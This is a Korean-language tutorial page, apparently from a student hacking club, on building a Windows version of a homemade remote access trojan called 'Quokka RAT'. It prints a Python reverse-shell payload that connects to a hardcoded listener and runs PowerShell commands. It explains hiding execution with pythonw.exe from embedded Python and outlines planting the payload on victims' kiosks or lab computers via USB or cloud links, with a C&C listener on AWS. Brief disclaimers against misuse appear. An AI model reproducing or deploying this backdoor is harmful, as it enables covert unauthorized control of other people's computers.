# Quokka RAT : Windows Embeded Python

<aside>
⚠️ author : 김철수(blackChsu) 2024-03-17

</aside>

<aside>
⚠️ **주의** : 악성코드를 악용하여 개인적/법적 문제가 발생하는 경우, 동아리와는 아무 관련이 없으며 개인의 책임임을 고지합니다.

</aside>

<aside>
⚠️ **주의** : 이 페이지는 실습해보지 않아도 됩니다.
다시 한번 말하지만, 블랙 해킹을 장려하거나 지시한 적 없습니다.

</aside>

# Quokka RAT Windows

리눅스에서 작동하는 RAT 을 제작해봤습니다.

Windows 버전의 Quokka RAT 을 이용하여 Windows 가 설치된 키오스크나 실습실 컴퓨터 등의 노출된 곳에 백도어를 만들 수 있습니다.

![Untitled](Untitled%20608.png)

![Untitled](Untitled%20609.png)

# Payload

powershell 을 실행하는 subprocess() 함수는 아래와 같으니,

```bash
## https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
import subprocess

# PowerShell을 사용하여 ls 명령어 실행
result = subprocess.run(['powershell.exe', '-Command', 'ls'], stdout=subprocess.PIPE, text=True)

# 결과 출력
print(result.stdout)

```

이것이 Windows 용 페이로드입니다.

```bash
import socket
import subprocess
import time
h="172.17.0.3"
p=8282

while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((h,p))
        while True:
            c=s.recv(1024).decode()
            # PowerShell을 사용하여 ls 명령어 실행
            output=subprocess.run(['powershell.exe', '-Command', 'ls'], stdout=subprocess.PIPE, text=True)
            result=output.stdout
            if(result==''):
                s.send("suc".encode())
            else:
                s.send(result.encode())
    except Exception as e:
        time.sleep(5)
```

# Embeded Python

공격대상 시스템에 python 이 설치되어있다면 상관없지만, 없는 경우 악성코드를 실행하는 것이 불가능합니다.

Embeded Python 은, 무설치 버전의 파이썬으로, exe 단독으로 동작합니다.

- 파이썬 공식 홈페이지에서 다운받을 수 있습니다.

[EmbeddedPython - Python Wiki](https://wiki.python.org/moin/EmbeddedPython)

![Untitled](Untitled%20610.png)

![Untitled](Untitled%20611.png)

![Untitled](Untitled%20612.png)

# Windows 에서 백그라운드로 python 실행

리눅스의 python 실행은 python3 라는 바이너리를 실행하여 이루어집니다.

- 리눅스에서의 python 백그라운드 실행은, python3 명령어 뒤에 & 를 붙여서 실행합니다.

Windows 에서는 그와 다르게, python.exe 와 pythonw.exe 가 존재합니다.

- python.exe 로 코드를 실행하면, 검은색 터미널 (cmd 또는 powershell) 이 뜨면서 실행됩니다.
- pythonw.exe 로 코드를 실행하면, 검은색 터미널 없이 코드만 백그라운드로 실행됩니다.

테스트를 위해 [test.py](http://test.py) 를 만들고, 아래와 같이 적습니다.

- 30초 대기 후, 프로세스가 자동종료됩니다.

```python
import time

print("Hello")
time.sleep(30)
```

python 명령어는 python.exe 를 실행합니다. 경로는 시스템환경변수를 따릅니다.

아래와 같이, 콘솔창에서 실행됩니다.

![Untitled](Untitled%20613.png)

pythonw 명령어는 pythonw.exe 를 실행합니다. 경로는 시스템환경변수를 따릅니다.

아래와 같이, 콘솔을 꺼도 실행됩니다.

![Untitled](Untitled%20614.png)

백그라운드에서 실행중이므로, “Windows 작업관리자” 에서만 확인할 수 있습니다.

- Windows 작업관리자는 리눅스에서 ps -ef 와 동일한 작동을 합니다. 현재 프로세스를 보여줍니다.

Ctrl + Alt + Del 로 작업관리자를 열고, python 으로 검색해보면 백그라운드 프로세스를 찾을 수 있습니다.

![Untitled](Untitled%20615.png)

이것을 응용하면,

- Embeded Python 에서 pythonw.exe 를 복사해서 USB 에 담는다.
- Windows 용 Quokka RAT 의 페이로드를 USB 에 담는다.
- 희생자의 Windows 컴퓨터에서 실행한다.

또는,

- google Drive 나 Dropbox 를 이용해 Embeded Python pythonw.exe 와 페이로드를 전달한다

등을 이용하여 페이로드를 심고, AWS 등의 중계서버에 C&C 리스너를 설치하고 외부에서 리버스쉘로 침투할 수 있습니다.

하지만 하지마세요.

끝